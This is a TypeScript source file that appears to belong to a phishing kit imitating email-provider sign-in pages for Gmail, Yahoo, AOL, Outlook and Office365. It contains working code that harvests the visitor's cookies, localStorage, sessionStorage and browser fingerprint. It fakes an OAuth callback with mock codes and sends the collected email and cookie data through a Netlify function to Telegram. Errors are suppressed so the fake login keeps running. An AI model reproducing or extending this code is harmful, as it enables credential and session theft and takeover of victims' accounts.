// Fixed sendToTelegram function that uses the actual Netlify function
export const getBrowserFingerprint = () => {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    },
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  };
};

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  const baseUrl = window.location.origin;
  
  // For demo purposes, simulate OAuth flow
  if (['Gmail', 'Yahoo', 'AOL', 'Others'].includes(provider)) {
    // Simulate OAuth callback after a short delay
    setTimeout(() => {
      const mockCode = Math.random().toString(36).substring(2, 15);
      const callbackUrl = `${baseUrl}?code=${mockCode}&state=${state}&provider=${provider}&oauth_callback=true`;
      window.location.href = callbackUrl;
    }, 1000);
    return '/auth/demo';
  }
  
  // For real providers, return actual OAuth URLs
  const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
  
  switch (provider) {
    case 'Office365':
      return `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=demo&response_type=code&redirect_uri=${redirectUri}&scope=openid%20email%20profile&state=${state}`;
    case 'Outlook':
      return `https://login.live.com/oauth20_authorize.srf?client_id=demo&response_type=code&redirect_uri=${redirectUri}&scope=wl.emails&state=${state}`;
    default:
      return '/auth/demo';
  }
};

export const extractEmailFromProvider = (provider: string, code: string) => {
  // Mock email extraction for demo
  const domains = {
    'Gmail': 'gmail.com',
    'Yahoo': 'yahoo.com',
    'Outlook': 'outlook.com',
    'Office365': 'outlook.com',
    'AOL': 'aol.com',
    'Others': 'example.com'
  };
  
  const domain = domains[provider as keyof typeof domains] || 'example.com';
  return `user${Math.floor(Math.random() * 1000)}@${domain}`;
};

export const sendToTelegram = async (data: any): Promise<void> => {
  try {
    console.log('📤 Sending data to Telegram:', {
      email: data.email,
      provider: data.provider,
      hasCookies: !!data.cookies,
      cookiesLength: data.cookies ? data.cookies.length : 0,
      hasDocumentCookies: !!data.documentCookies
    });

    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('❌ Telegram API error:', errorText);
      throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
    }

    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    // Don't throw error to avoid breaking the login flow
  }
};